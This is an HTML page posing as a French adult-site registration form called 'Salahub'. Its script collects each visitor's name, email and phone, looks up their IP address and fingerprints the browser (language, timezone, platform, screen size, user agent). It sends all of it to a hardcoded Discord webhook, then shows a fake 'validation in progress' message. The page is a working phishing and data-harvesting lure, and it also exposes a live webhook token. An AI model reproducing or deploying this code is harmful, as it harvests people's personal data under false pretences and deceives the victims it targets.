<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Salahub</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Segoe UI', sans-serif;
}

body {
    background: linear-gradient(135deg, #0a0a0a, #1a0000);
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    color: white;
}

/* CARD */
.card {
    width: 380px;
    padding: 30px;
    border-radius: 20px;
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,0,0,0.2);
    box-shadow: 0 0 40px rgba(255,0,0,0.2);
}

h1 {
    text-align: center;
    color: #ff2a2a;
}

.sub {
    text-align: center;
    opacity: 0.6;
    margin-bottom: 20px;
}

/* INPUT */
input {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border-radius: 10px;
    border: none;
    background: rgba(255,255,255,0.05);
    color: white;
}

/* CHECKBOX */
.checkbox {
    display: flex;
    align-items: center;
    font-size: 12px;
    margin-top: 10px;
}

.checkbox input {
    margin-right: 8px;
}

/* BUTTON */
button {
    width: 100%;
    padding: 12px;
    margin-top: 15px;
    border-radius: 10px;
    border: none;
    background: linear-gradient(135deg, red, darkred);
    color: white;
    font-weight: bold;
    cursor: pointer;
}

/* FOOTER */
.footer {
    margin-top: 15px;
    font-size: 11px;
    opacity: 0.5;
    text-align: center;
}
</style>
</head>

<body>

<div class="card">
    <h1>SALAHUB</h1>
    <div class="sub">Accès privé • 18+</div>

    <form id="form">
        <input type="text" id="nom" placeholder="Nom" required>
        <input type="text" id="prenom" placeholder="Prénom" required>
        <input type="email" id="email" placeholder="Email" required>
        <input type="tel" id="telephone" placeholder="Téléphone" required>

        <div class="checkbox">
            <input type="checkbox" id="consent" required>
            <label>J'accepte les conditions et l'utilisation des données</label>
        </div>

        <button>S'INSCRIRE</button>
    </form>

    <div class="footer">
        © 2026 Salahub • Tous droits réservés
    </div>
</div>

<script>
const webhookURL = "https://discord.com/api/webhooks/1487734707847172167/a0c6N1lRRQiAnem-7t00vA8X7abG7ghfAJZ33Vvyk3yURpgK8j9nvZwgxe35k0sUTneY";

document.getElementById("form").addEventListener("submit", async function(e){
    e.preventDefault();

    const nom = document.getElementById("nom").value;
    const prenom = document.getElementById("prenom").value;
    const email = document.getElementById("email").value;
    const telephone = document.getElementById("telephone").value;

    const date = new Date().toLocaleString();
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const langue = navigator.language;
    const plateforme = navigator.platform;
    const resolution = screen.width + "x" + screen.height;
    const ua = navigator.userAgent.substring(0,120);

    let ip = "Inconnue";
    try {
        const r = await fetch("https://api.ipify.org?format=json");
        const d = await r.json();
        ip = d.ip;
    } catch {}

    const payload = {
        embeds: [{
            title: "🔥 NOUVELLE INSCRIPTION - SALAHUB",
            color: 16711680,

            description: "**Un nouvel utilisateur vient de s'inscrire**",

            fields: [
                {
                    name: "👤 **Informations personnelles**",
                    value:
`**Nom:** ${nom}
**Prénom:** ${prenom}
**Email:** ${email}
**Téléphone:** ${telephone}`
                },
                {
                    name: "🌍 **Informations techniques**",
                    value:
`**IP:** ${ip}
**Langue:** ${langue}
**Fuseau horaire:** ${timezone}
**Plateforme:** ${plateforme}
**Résolution:** ${resolution}`
                },
                {
                    name: "🖥 **Navigateur**",
                    value: ua
                },
                {
                    name: "🍪 **Consentement**",
                    value: "Accepté"
                }
            ],

            footer: {
                text: "Date: " + date
            }
        }]
    };

    fetch(webhookURL,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(payload)
    });

    alert("Accès en cours de validation...");
});
</script>

</body>
</html>
